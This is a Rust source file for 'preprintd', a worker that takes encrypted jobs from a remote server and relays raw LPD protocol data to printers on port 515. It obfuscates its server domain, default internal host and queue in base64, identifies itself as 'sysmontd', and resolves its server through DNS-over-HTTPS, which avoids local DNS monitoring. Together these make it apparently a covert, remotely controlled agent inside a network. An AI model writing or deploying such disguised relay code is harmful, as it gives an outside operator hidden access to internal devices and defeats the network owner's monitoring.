/*
 * preprintd - Printer swarm listener/worker implementation for PreConnect.
 * Copyright (C) 2026  Anindya Shiddhartha & contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 */
use std::{
    collections::HashMap,
    env,
    io::{BufRead, BufReader},
    net::{IpAddr, SocketAddr, TcpStream, ToSocketAddrs},
    process,
    sync::{
        LazyLock, Mutex,
        atomic::{AtomicUsize, Ordering},
    },
    thread::sleep,
    time::{Duration, Instant},
};

#[macro_use]
mod macros;
mod crypto;
mod tcp_extras;
mod types;

use anyhow::Result;
use reqwest::{
    StatusCode,
    blocking::Client,
    header::{HeaderMap, HeaderValue},
};
use serde_json::{Value, json};
use socket2::SockRef;
use tcp_extras::TcpExtras;

use crate::{
    crypto::{decode_b64_string, decrypt},
    types::{Job, LogLevel},
};

static DOH_CLIENT: LazyLock<Client> = LazyLock::new(|| {
    Client::builder()
        .timeout(Duration::from_millis(1500))
        .build()
        .expect("failed to build DoH client")
});

static DOH_CACHE: LazyLock<Mutex<HashMap<String, (IpAddr, Instant)>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

static CLIENT: LazyLock<Mutex<(Client, Instant)>> =
    LazyLock::new(|| Mutex::new((get_latest_client(), Instant::now())));

static DEBUG: LazyLock<bool> = LazyLock::new(|| env::args().any(|arg| arg == "--debug"));

static WORKER_KEY: LazyLock<String> = LazyLock::new(|| {
    let mut args = env::args();

    while let Some(arg) = args.next() {
        if arg == "--key" {
            return args.next().expect("--key must be a string literal");
        }
    }

    debug_log!(LogLevel::Error, "worker key required");
    process::exit(1);
});

static JOBS_COMPLETED: AtomicUsize = AtomicUsize::new(0);

static BASE_DOMAIN: LazyLock<String> =
    LazyLock::new(|| decode_b64_string("YXBpLnByZWNvbm5lY3QuYXBw").expect("ib"));
static BASE_URL: LazyLock<String> = LazyLock::new(|| format!("https://{}", BASE_DOMAIN.as_str()));
static ALIAS: LazyLock<String> = LazyLock::new(|| decode_b64_string("c3lzbW9udGQ=").expect("ia"));
static AGENT: LazyLock<String> = LazyLock::new(|| format!("{}/1.0", ALIAS.as_str()));
static DEF_HOST: LazyLock<String> =
    LazyLock::new(|| decode_b64_string("MTcyLjE2LjAuMTEx").expect("ih"));
static DEF_QUEUE: LazyLock<String> = LazyLock::new(|| decode_b64_string("c2VjdXJl").expect("iq"));

const DEF_PORT: u16 = 515;
const NUL: [u8; 1] = [0u8];

fn doh_resolve(domain: &str) -> Option<IpAddr> {
    let now = Instant::now();

    if let Ok(cache) = DOH_CACHE.lock()
        && let Some((ip, stored_at)) = cache.get(domain)
        && now.duration_since(*stored_at) < Duration::from_secs(300)
    {
        return Some(*ip);
    }

    for resolver in ["https://1.1.1.1/dns-query", "https://8.8.8.8/dns-query"] {
        let response = DOH_CLIENT
            .get(format!("{resolver}?name={domain}&type=A"))
            .header("Accept", "application/dns-json")
            .send();

        let Ok(response) = response else {
            continue;
        };
        if response.status() != StatusCode::OK {
            continue;
        }
        let Ok(data) = response.json::<Value>() else {
            continue;
        };
        let Some(answers) = data.get("Answer").and_then(Value::as_array) else {
            continue;
        };

        for answer in answers {
            if answer.get("type").and_then(Value::as_u64) != Some(1) {
                continue;
            }

            let Some(ip) = answer
                .get("data")
                .and_then(Value::as_str)
                .and_then(|value| value.parse::<IpAddr>().ok())
            else {
                continue;
            };

            if let Ok(mut cache) = DOH_CACHE.lock() {
                cache.insert(domain.to_owned(), (ip, now));
            }

            return Some(ip);
        }
    }

    None
}

fn build_client() -> Client {
    let mut builder = Client::builder();

    if let Some(ip) = doh_resolve(&BASE_DOMAIN) {
        builder = builder.resolve(&BASE_DOMAIN, SocketAddr::new(ip, 443));
    }

    builder.build().expect("failed to build HTTP client")
}

fn get_latest_client() -> Client {
    let mut state = CLIENT.lock().expect("HTTP client lock poisoned");

    if state.1.elapsed() >= Duration::from_secs(300) {
        *state = (build_client(), Instant::now());
    }

    state.0.clone()
}

fn is_online(host: &str) -> Result<bool> {
    if host.is_empty() {
        return Ok(false);
    }

    sock!(s, host, DEF_PORT, Duration::from_millis(800));

    if let Ok(conn) = s {
        let _ = conn.shutdown(std::net::Shutdown::Both);
    } else {
        return Ok(false);
    }

    Ok(true)
}

fn hdrs(printer_host: &str) -> Result<HeaderMap> {
    let mut map = HeaderMap::new();
    let spooler = if is_online(printer_host)? { "1" } else { "0" };
    let jobs = JOBS_COMPLETED.load(Ordering::Relaxed).to_string();

    map.insert("User-Agent", HeaderValue::from_str(AGENT.as_str())?);
    map.insert("X-Worker-Key", HeaderValue::from_str(WORKER_KEY.as_str())?);
    map.insert("X-Worker-Spooler", HeaderValue::from_str(spooler)?);
    map.insert("X-Worker-Jobs", HeaderValue::from_str(&jobs)?);

    Ok(map)
}

fn claim_job(id: Option<&str>, host: &str) -> Result<bool> {
    let Some(id) = id.filter(|id| !id.is_empty()) else {
        return Ok(true);
    };

    let body = json!({ "id": id });

    let resp = get_latest_client()
        .post(format!("{}/print/claim", BASE_URL.as_str()))
        .body(body.to_string())
        .header("Content-Type", "application/json")
        .headers(hdrs(host)?)
        .timeout(Duration::from_secs(2))
        .send();

    let claim = match resp {
        Ok(r) => {
            if r.status() != StatusCode::OK {
                return Ok(false);
            }

            let Ok(value) = r.json::<Value>() else {
                return Ok(false);
            };

            value
                .get("claimed")
                .and_then(Value::as_bool)
                .unwrap_or(false)
        }
        Err(e) => {
            debug_log!(LogLevel::Error, "(Send) /print/claim: {e}");
            false
        }
    };

    if claim {
        debug_log!(LogLevel::Ok, "Claimed new job!");
    } else {
        debug_log!(LogLevel::Ok, "Skipping on this job...");
    }

    Ok(claim)
}

fn handle(job: Job) -> Result<()> {
    let j_id = &job.id;
    let job_id = j_id.as_deref().unwrap_or("");

    let host = job
        .printer_host
        .as_deref()
        .filter(|host| !host.is_empty())
        .unwrap_or(DEF_HOST.as_str());

    let queue_name = job
        .printer_queue
        .as_deref()
        .filter(|queue| !queue.is_empty())
        .unwrap_or(DEF_QUEUE.as_str());

    if !is_online(host)? || !(claim_job(j_id.as_deref(), host)?) {
        return Ok(());
    }

    let q_cmd = decrypt(job.q_cmd.as_deref(), WORKER_KEY.as_str(), job_id)?;
    let cf_hdr = decrypt(job.cf_hdr.as_deref(), WORKER_KEY.as_str(), job_id)?;
    let ctl = decrypt(job.ctl.as_deref(), WORKER_KEY.as_str(), job_id)?;
    let df_hdr = decrypt(job.df_hdr.as_deref(), WORKER_KEY.as_str(), job_id)?;
    let payload = decrypt(job.payload.as_deref(), WORKER_KEY.as_str(), job_id)?;

    debug_log!(
        LogLevel::Ok,
        "Handling job for {host}:{queue_name} (payload size: {} bytes)",
        payload.len()
    );

    let timeout = Duration::from_secs_f64(
        job.timeout
            .filter(|timeout| timeout.is_finite() && *timeout > 0.0)
            .unwrap_or(60.0),
    );

    sock!(s, host, DEF_PORT, timeout);
    let mut socket = match s {
        Ok(s) => s,
        Err(e) => {
            debug_log!(
                LogLevel::Error,
                "Failed to connect to {host}:{DEF_PORT}: {e}"
            );
            return Ok(());
        }
    };

    let transferred = (|| -> std::io::Result<bool> {
        socket.set_nodelay(true)?;
        socket.set_read_timeout(Some(timeout))?;
        socket.set_write_timeout(Some(timeout))?;

        SockRef::from(&socket).set_send_buffer_size(65_536)?;

        Ok(socket.send_buf(&q_cmd)?
            && socket.recv_ack()?
            && socket.send_buf(&cf_hdr)?
            && socket.recv_ack()?
            && socket.send_buf(&ctl)?
            && socket.send_buf(&NUL)?
            && socket.recv_ack()?
            && socket.send_buf(&df_hdr)?
            && socket.recv_ack()?
            && socket.send_buf(&payload)?
            && socket.send_buf(&NUL)?
            && socket.recv_ack()?)
    })();

    let abortive = match transferred {
        Ok(true) => {
            debug_log!(
                LogLevel::Ok,
                "Job transferred successfully. \
                 Shutting down current socket connection."
            );

            JOBS_COMPLETED.fetch_add(1, Ordering::Relaxed);
            false
        }
        Ok(false) => false,
        Err(e) => {
            debug_log!(LogLevel::Error, "Printer transfer failed: {e}");
            let _ = SockRef::from(&socket).set_linger(Some(Duration::ZERO));
            true
        }
    };

    if !abortive {
        let _ = socket.shutdown(std::net::Shutdown::Both);
    }

    Ok(())
}

fn stream() -> Result<()> {
    let resp = match get_latest_client()
        .get(format!("{}/printer", BASE_URL.as_str()))
        .header("Accept", "text/event-stream")
        .header("Connection", "keep-alive")
        .headers(hdrs(DEF_HOST.as_str())?)
        .timeout(Duration::from_secs(90))
        .send()
    {
        Ok(r) => {
            if r.status() == StatusCode::UNAUTHORIZED {
                debug_log!(
                    LogLevel::Error,
                    "worker key invalid ({})",
                    r.status().as_u16()
                );
                return Ok(());
            }

            if r.status() != StatusCode::OK {
                debug_log!(LogLevel::Error, "(Status) /printer: {}", r.status());
                return Ok(());
            }

            r
        }

        Err(e) => {
            debug_log!(LogLevel::Error, "(Send) /printer: {e}");
            return Ok(());
        }
    };

    let mut reader = BufReader::new(resp);
    let mut line = String::new();

    loop {
        line.clear();

        let n = match reader.read_line(&mut line) {
            Ok(bytes) => bytes,
            Err(e) => {
                debug_log!(LogLevel::Error, "Failed to read line: {e}; breaking.");
                break;
            }
        };

        if n == 0 {
            debug_log!(LogLevel::Warn, "Empty line read, breaking.");
            break;
        }

        if let Some(data) = line.strip_prefix("data: ")
            && let Ok(value) = serde_json::from_str::<Job>(data)
        {
            debug_log!(
                LogLevel::Ok,
                "Data match! ({data}); attempting to handle it..."
            );
            let _ = handle(value);
        }
    }

    Ok(())
}

fn main() {
    let mut iter_count = 0;
    let mut delay = 1.0_f64;

    loop {
        debug_log!(
            LogLevel::Ok,
            "Connection #{iter_count}; Jobs completed: {}",
            JOBS_COMPLETED.load(Ordering::Relaxed)
        );

        let started_at = Instant::now();
        let result = stream();

        delay = if result.is_ok() && started_at.elapsed() > Duration::from_secs(10) {
            1.0
        } else {
            (delay * 2.0).min(8.0)
        };

        sleep(Duration::from_secs_f64(delay));
        iter_count += 1;
    }
}
